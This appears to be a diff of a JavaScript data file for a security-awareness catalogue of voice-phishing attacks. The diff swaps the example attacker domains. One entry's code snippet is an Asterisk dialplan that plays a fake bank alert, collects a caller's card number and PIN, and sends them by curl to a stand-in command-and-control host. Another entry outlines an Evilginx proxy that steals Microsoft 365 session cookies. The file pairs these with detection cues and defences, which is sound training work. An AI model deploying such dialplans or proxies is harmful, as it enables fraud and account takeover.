@@ -111,7 +111,7 @@ exten => s,1,Answer()
 exten => s,n,Playback(bank_alert_notice)
 exten => s,n,Read(CARD_NUM,enter_card_number,16)
 exten => s,n,Read(ATM_PIN,enter_atm_pin,4)
-exten => s,n,System(curl -X POST https://c2.evil-harvest.in/log?card=\${CARD_NUM}&pin=\${ATM_PIN})`
+exten => s,n,System(curl -X POST https://attacker-c2.net/log?card=\${CARD_NUM}&pin=\${ATM_PIN})`
     },
     aitm_session_capture_vishing: {
       key: "aitm_session_capture_vishing",
@@ -126,7 +126,7 @@ exten => s,n,System(curl -X POST https://c2.evil-harvest.in/log?card=\${CARD_NUM
       telemetryIndicator: "Simultaneous user login events originating from two distinct geographical IP addresses",
       resilientDefense: "FIDO2 WebAuthn passkeys (cryptographic origin binding prevents proxy cookie theft).",
       codeSnippet: `// AiTM Reverse Proxy Capture (Evilginx):
-// [Victim on Phone] ➔ [Evilginx Proxy: login.microsoft.evil-host.in] ➔ [Real Microsoft 365]
+// [Victim on Phone] ➔ [Evilginx Proxy: login.microsoft.attacker-host.net] ➔ [Real Microsoft 365]
 // Proxy intercepts: ESTSAUTH=AQABBAAA... (Captured Session Cookie!)
 // Result: Attacker logs in directly bypassing SMS OTP!`
     },
